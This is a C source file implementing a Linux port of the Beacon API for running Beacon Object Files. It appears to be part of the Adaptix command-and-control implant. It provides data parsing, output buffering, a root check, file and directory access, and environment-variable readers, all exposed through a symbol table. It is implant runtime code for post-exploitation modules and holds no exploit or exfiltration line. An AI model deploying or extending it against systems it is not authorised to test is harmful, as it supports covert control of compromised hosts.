/// bof_api.c — Linux Beacon API implementation for BOF execution
/// Port of beacon_functions.cpp (Windows) to Linux C with nostdlib

#include "bof_api.h"
#include "crt.h"
#include "types.h"
#include "msgpack.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

/// ────────────────────────────────────────────────────────────────────────────
/// Global state — set by elf_bof.c before calling BOF entry point
/// ────────────────────────────────────────────────────────────────────────────

/// Output accumulator buffer
static buffer_t bof_output_buf;
static int      bof_output_initialized = 0;
static int      bof_output_error_type  = 0;  // 0 = no error, >0 = error code

void bof_output_init(void) {
    if (!bof_output_initialized) {
        buf_init(&bof_output_buf, 4096);
        bof_output_initialized = 1;
    } else {
        buf_reset(&bof_output_buf);
    }
    bof_output_error_type = 0;
}

void bof_output_cleanup(void) {
    if (bof_output_initialized) {
        buf_free(&bof_output_buf);
        bof_output_initialized = 0;
    }
}

/// Get accumulated output (null-terminated)
const char *bof_output_get(int *out_len) {
    if (!bof_output_initialized || bof_output_buf.len == 0) {
        if (out_len) *out_len = 0;
        return "";
    }
    // Ensure null termination
    char zero = '\0';
    buf_append(&bof_output_buf, &zero, 1);
    bof_output_buf.len--;  // don't count the null in length
    if (out_len) *out_len = bof_output_buf.len;
    return (const char *)bof_output_buf.data;
}

int bof_output_get_error(void) {
    return bof_output_error_type;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Endianness swap (for BeaconFormatInt — big-endian encoding)
/// ────────────────────────────────────────────────────────────────────────────

static unsigned int swap_endianness(unsigned int indata) {
    unsigned int testint = 0xaabbccdd;
    unsigned int outint = indata;
    if (((unsigned char *)&testint)[0] == 0xdd) {
        ((unsigned char *)&outint)[0] = ((unsigned char *)&indata)[3];
        ((unsigned char *)&outint)[1] = ((unsigned char *)&indata)[2];
        ((unsigned char *)&outint)[2] = ((unsigned char *)&indata)[1];
        ((unsigned char *)&outint)[3] = ((unsigned char *)&indata)[0];
    }
    return outint;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Data Parser API (CS-compatible)
/// ────────────────────────────────────────────────────────────────────────────

void BeaconDataParse(datap *parser, char *buffer, int size) {
    if (!parser || !buffer)
        return;
    parser->original = buffer;
    parser->buffer   = buffer + 4;
    parser->length   = size - 4;
    parser->size     = size - 4;
}

int BeaconDataInt(datap *parser) {
    if (!parser || parser->length < 4)
        return 0;
    int val = 0;
    ax_memcpy(&val, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

short BeaconDataShort(datap *parser) {
    if (!parser || parser->length < 2)
        return 0;
    short val = 0;
    ax_memcpy(&val, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

int BeaconDataLength(datap *parser) {
    if (!parser)
        return 0;
    return parser->length;
}

char *BeaconDataExtract(datap *parser, int *size) {
    if (!parser || parser->length < 4)
        return (char *)0;

    unsigned int length = 0;
    ax_memcpy(&length, parser->buffer, 4);
    parser->length -= 4;
    parser->buffer += 4;

    char *outdata = parser->buffer;

    parser->length -= length;
    parser->buffer += length;

    if (size)
        *size = length;
    return outdata;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Output API
/// ────────────────────────────────────────────────────────────────────────────

void BeaconOutput(int type, const char *data, int len) {
    if (!data || !bof_output_initialized)
        return;

    if (type == CALLBACK_ERROR) {
        bof_output_error_type = CALLBACK_ERROR;
    }

    if (len > 0) {
        buf_append(&bof_output_buf, data, len);
    } else {
        // If len == 0, treat data as null-terminated string
        int slen = (int)ax_strlen(data);
        buf_append(&bof_output_buf, data, slen);
    }
}

void BeaconPrintf(int type, const char *fmt, ...) {
    if (!fmt || !bof_output_initialized)
        return;

    if (type == CALLBACK_ERROR) {
        bof_output_error_type = CALLBACK_ERROR;
    }

    // First pass: compute needed length
    va_list args;
    va_start(args, fmt);
    int needed = ax_vsnprintf((char *)0, 0, fmt, args);
    va_end(args);

    if (needed <= 0)
        return;

    // Allocate temporary buffer
    char *tmp = (char *)ax_malloc(needed + 1);
    if (!tmp)
        return;

    va_start(args, fmt);
    ax_vsnprintf(tmp, needed + 1, fmt, args);
    va_end(args);

    buf_append(&bof_output_buf, tmp, needed);
    ax_free(tmp);
}

/// ────────────────────────────────────────────────────────────────────────────
/// Format API
/// ────────────────────────────────────────────────────────────────────────────

void BeaconFormatAlloc(formatp *format, int maxsz) {
    if (!format)
        return;
    format->original = (char *)ax_malloc(maxsz);
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = maxsz;
}

void BeaconFormatReset(formatp *format) {
    if (!format || !format->original)
        return;
    ax_memset(format->original, 0, format->size);
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatAppend(formatp *format, const char *text, int len) {
    if (!format || !text)
        return;
    if (format->length + len > format->size)
        return;
    ax_memcpy(format->buffer, text, len);
    format->buffer += len;
    format->length += len;
}

void BeaconFormatPrintf(formatp *format, const char *fmt, ...) {
    if (!format || !fmt)
        return;

    va_list args;
    va_start(args, fmt);
    int remaining = format->size - format->length;
    if (remaining <= 0) {
        va_end(args);
        return;
    }
    int written = ax_vsnprintf(format->buffer, remaining, fmt, args);
    va_end(args);

    if (written > 0) {
        format->length += written;
        format->buffer += written;
    }
}

char *BeaconFormatToString(formatp *format, int *size) {
    if (!format)
        return (char *)0;
    if (size)
        *size = format->length;
    return format->original;
}

void BeaconFormatFree(formatp *format) {
    if (!format)
        return;
    if (format->original) {
        ax_memset(format->original, 0, format->size);
        ax_free(format->original);
    }
    format->original = (char *)0;
    format->buffer   = (char *)0;
    format->length   = 0;
    format->size     = 0;
}

void BeaconFormatInt(formatp *format, int value) {
    if (!format)
        return;
    if (format->length + 4 > format->size)
        return;
    unsigned int outdata = swap_endianness((unsigned int)value);
    ax_memcpy(format->buffer, &outdata, 4);
    format->length += 4;
    format->buffer += 4;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Utility APIs
/// ────────────────────────────────────────────────────────────────────────────

int BeaconIsAdmin(void) {
    return (sys_geteuid() == 0) ? 1 : 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Async BOF context — set by elf_bof.c before calling BOF entry in async thread
/// ────────────────────────────────────────────────────────────────────────────

/// Opaque pointer to async_bof_arg_t (from elf_bof.c)
/// Set to non-NULL only during async BOF execution, checked by BOF APIs.
/// Thread safety: only one async BOF calls elf_bof_execute at a time per thread,
/// and the main thread's sync BOFs run serially, so no race on this pointer.
static volatile void *g_async_bof_ctx = (void *)0;
static volatile int   g_async_bof_stop_fd = -1;  // read-end of stop_pipe

void bof_set_async_ctx(void *ctx, int stop_fd) {
    g_async_bof_ctx = ctx;
    g_async_bof_stop_fd = stop_fd;
}

void bof_clear_async_ctx(void) {
    g_async_bof_ctx = (void *)0;
    g_async_bof_stop_fd = -1;
}

int bof_is_async(void) {
    return g_async_bof_ctx != (void *)0;
}

void BeaconWakeup(void) {
    // No-op on Linux: async BOF has its own C2 connection,
    // output is sent directly without needing to wake the main thread.
}

int BeaconGetStopJobEvent(void) {
    // Returns the read-end fd of the stop pipe.
    // BOF can poll() this fd to check if kill was requested.
    // Returns -1 if not in an async BOF context.
    return (int)g_async_bof_stop_fd;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Adaptix extensions
/// ────────────────────────────────────────────────────────────────────────────

void AxDownloadMemory(char *filename, char *data, int len) {
    // For now, encode as text output (full implementation would use TsDownloadSave)
    if (!bof_output_initialized)
        return;

    char header[256];
    ax_snprintf(header, sizeof(header), "[download] %s (%d bytes)\n", filename ? filename : "unknown", len);
    int hlen = (int)ax_strlen(header);
    buf_append(&bof_output_buf, header, hlen);

    // TODO: implement proper file download via separate channel when needed
}

/// ────────────────────────────────────────────────────────────────────────────
/// Linux system primitives — exposed to BOFs via symbol table
/// ────────────────────────────────────────────────────────────────────────────

// File I/O wrappers
int AxOpenFile(const char *path, int flags, int mode) {
    if (!path) return -1;
    return sys_open(path, flags, mode);
}

int AxCloseFile(int fd) {
    if (fd < 0) return -1;
    return sys_close(fd);
}

int AxReadFile(int fd, void *buf, int count) {
    if (fd < 0 || !buf || count <= 0) return -1;
    return (int)sys_read(fd, buf, (size_t)count);
}

// Convenience: read entire file into malloc'd buffer
int AxReadFileToBuffer(const char *path, char **out_buf, int max_size) {
    if (!path || !out_buf) return -1;
    if (max_size <= 0) max_size = 1048576;  // 1 MB default

    int fd = sys_open(path, 0 /* O_RDONLY */, 0);
    if (fd < 0) return -1;

    char *buf = (char *)ax_malloc(max_size + 1);
    if (!buf) {
        sys_close(fd);
        return -1;
    }

    int total = 0;
    while (total < max_size) {
        int n = (int)sys_read(fd, buf + total, max_size - total);
        if (n <= 0) break;
        total += n;
    }
    sys_close(fd);

    buf[total] = '\0';
    *out_buf = buf;
    return total;
}

// File stat wrapper
int AxFileStat(const char *path, unsigned int *out_mode, long *out_size,
               unsigned int *out_uid, unsigned int *out_gid) {
    if (!path) return -1;
    struct linux_stat st;
    int ret = sys_stat(path, &st);
    if (ret != 0) return -1;
    if (out_mode) *out_mode = st.st_mode;
    if (out_size) *out_size = st.st_size;
    if (out_uid)  *out_uid  = st.st_uid;
    if (out_gid)  *out_gid  = st.st_gid;
    return 0;
}

// Directory listing
int AxOpenDir(const char *path) {
    if (!path) return -1;
    return sys_open(path, 0x10000 /* O_RDONLY | O_DIRECTORY */, 0);
}

int AxReadDir(int fd, void *buf, int bufsize) {
    if (fd < 0 || !buf || bufsize <= 0) return -1;
    return sys_getdents64(fd, buf, (unsigned int)bufsize);
}

// Memory
void *AxMalloc(int size) {
    if (size <= 0) return (void *)0;
    return ax_malloc((size_t)size);
}

void AxFree(void *ptr) {
    if (ptr) ax_free(ptr);
}

void *AxMemset(void *s, int c, int n) {
    if (!s || n <= 0) return s;
    return ax_memset(s, c, (size_t)n);
}

void *AxMemcpy(void *dst, const void *src, int n) {
    if (!dst || !src || n <= 0) return dst;
    return ax_memcpy(dst, src, (size_t)n);
}

// String operations
int AxStrlen(const char *s) {
    if (!s) return 0;
    return (int)ax_strlen(s);
}

int AxStrcmp(const char *a, const char *b) {
    if (!a || !b) return -1;
    return ax_strcmp(a, b);
}

int AxStrncmp(const char *a, const char *b, int n) {
    if (!a || !b || n <= 0) return -1;
    return ax_strncmp(a, b, (size_t)n);
}

char *AxStrcpy(char *dst, const char *src) {
    if (!dst || !src) return dst;
    return ax_strcpy(dst, src);
}

char *AxStrncpy(char *dst, const char *src, int n) {
    if (!dst || !src || n <= 0) return dst;
    return ax_strncpy(dst, src, (size_t)n);
}

char *AxStrcat(char *dst, const char *src) {
    if (!dst || !src) return dst;
    return ax_strcat(dst, src);
}

char *AxStrstr(const char *haystack, const char *needle) {
    if (!haystack || !needle) return (char *)0;
    return ax_strstr(haystack, needle);
}

char *AxStrchr(const char *s, int c) {
    if (!s) return (char *)0;
    return ax_strchr(s, c);
}

// Formatted output
int AxSnprintf(char *buf, int size, const char *fmt, ...) {
    if (!buf || !fmt || size <= 0) return 0;
    va_list args;
    va_start(args, fmt);
    int ret = ax_vsnprintf(buf, (size_t)size, fmt, args);
    va_end(args);
    return ret;
}

// Process info
int AxGetPid(void) {
    return sys_getpid();
}

int AxGetUid(void) {
    return sys_getuid();
}

int AxGetEuid(void) {
    return sys_geteuid();
}

// getcwd
int AxGetCwd(char *buf, int size) {
    if (!buf || size <= 0) return -1;
    return sys_getcwd(buf, (size_t)size);
}

// getenv via /proc/self/environ
int AxGetEnv(const char *name, char *out_buf, int out_size) {
    if (!name || !out_buf || out_size <= 0) return -1;

    char *env_data = (char *)0;
    int env_len = AxReadFileToBuffer("/proc/self/environ", &env_data, 65536);
    if (env_len <= 0 || !env_data) return -1;

    int name_len = (int)ax_strlen(name);
    int found = -1;

    // /proc/self/environ entries are null-separated
    int pos = 0;
    while (pos < env_len) {
        char *entry = env_data + pos;
        int entry_len = 0;
        while (pos + entry_len < env_len && entry[entry_len] != '\0')
            entry_len++;

        // Check if entry starts with "name="
        if (entry_len > name_len + 1 &&
            ax_strncmp(entry, name, name_len) == 0 &&
            entry[name_len] == '=') {
            char *val = entry + name_len + 1;
            int val_len = entry_len - name_len - 1;
            if (val_len >= out_size) val_len = out_size - 1;
            ax_memcpy(out_buf, val, val_len);
            out_buf[val_len] = '\0';
            found = val_len;
            break;
        }

        pos += entry_len + 1;  // skip null separator
    }

    ax_free(env_data);
    return found;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Symbol resolution table — used by elf_bof.c
/// ────────────────────────────────────────────────────────────────────────────

typedef struct {
    const char *name;
    void       *func;
} bof_api_entry_t;

static bof_api_entry_t bof_api_table[] = {
    // Data Parser
    {"BeaconDataParse",      (void *)BeaconDataParse},
    {"BeaconDataInt",        (void *)BeaconDataInt},
    {"BeaconDataShort",      (void *)BeaconDataShort},
    {"BeaconDataLength",     (void *)BeaconDataLength},
    {"BeaconDataExtract",    (void *)BeaconDataExtract},

    // Output
    {"BeaconOutput",         (void *)BeaconOutput},
    {"BeaconPrintf",         (void *)BeaconPrintf},

    // Format
    {"BeaconFormatAlloc",    (void *)BeaconFormatAlloc},
    {"BeaconFormatReset",    (void *)BeaconFormatReset},
    {"BeaconFormatAppend",   (void *)BeaconFormatAppend},
    {"BeaconFormatPrintf",   (void *)BeaconFormatPrintf},
    {"BeaconFormatToString", (void *)BeaconFormatToString},
    {"BeaconFormatFree",     (void *)BeaconFormatFree},
    {"BeaconFormatInt",      (void *)BeaconFormatInt},

    // Utility
    {"BeaconIsAdmin",        (void *)BeaconIsAdmin},

    // Async BOF
    {"BeaconWakeup",         (void *)BeaconWakeup},
    {"BeaconGetStopJobEvent",(void *)BeaconGetStopJobEvent},

    // Adaptix
    {"AxDownloadMemory",     (void *)AxDownloadMemory},

    // Linux system primitives
    {"AxOpenFile",           (void *)AxOpenFile},
    {"AxCloseFile",          (void *)AxCloseFile},
    {"AxReadFile",           (void *)AxReadFile},
    {"AxReadFileToBuffer",   (void *)AxReadFileToBuffer},
    {"AxFileStat",           (void *)AxFileStat},
    {"AxOpenDir",            (void *)AxOpenDir},
    {"AxReadDir",            (void *)AxReadDir},
    {"AxMalloc",             (void *)AxMalloc},
    {"AxFree",               (void *)AxFree},
    {"AxMemset",             (void *)AxMemset},
    {"AxMemcpy",             (void *)AxMemcpy},
    {"AxStrlen",             (void *)AxStrlen},
    {"AxStrcmp",             (void *)AxStrcmp},
    {"AxStrncmp",            (void *)AxStrncmp},
    {"AxStrcpy",             (void *)AxStrcpy},
    {"AxStrncpy",            (void *)AxStrncpy},
    {"AxStrcat",             (void *)AxStrcat},
    {"AxStrstr",             (void *)AxStrstr},
    {"AxStrchr",             (void *)AxStrchr},
    {"AxSnprintf",           (void *)AxSnprintf},
    {"AxGetPid",             (void *)AxGetPid},
    {"AxGetUid",             (void *)AxGetUid},
    {"AxGetEuid",            (void *)AxGetEuid},
    {"AxGetCwd",             (void *)AxGetCwd},
    {"AxGetEnv",             (void *)AxGetEnv},

    // Sentinel
    {(const char *)0, (void *)0}
};

/// Resolve a BOF symbol by name. Returns function pointer or NULL.
void *bof_resolve_symbol(const char *name) {
    if (!name)
        return (void *)0;
    for (int i = 0; bof_api_table[i].name != (const char *)0; i++) {
        if (ax_strcmp(name, bof_api_table[i].name) == 0)
            return bof_api_table[i].func;
    }
    return (void *)0;
}
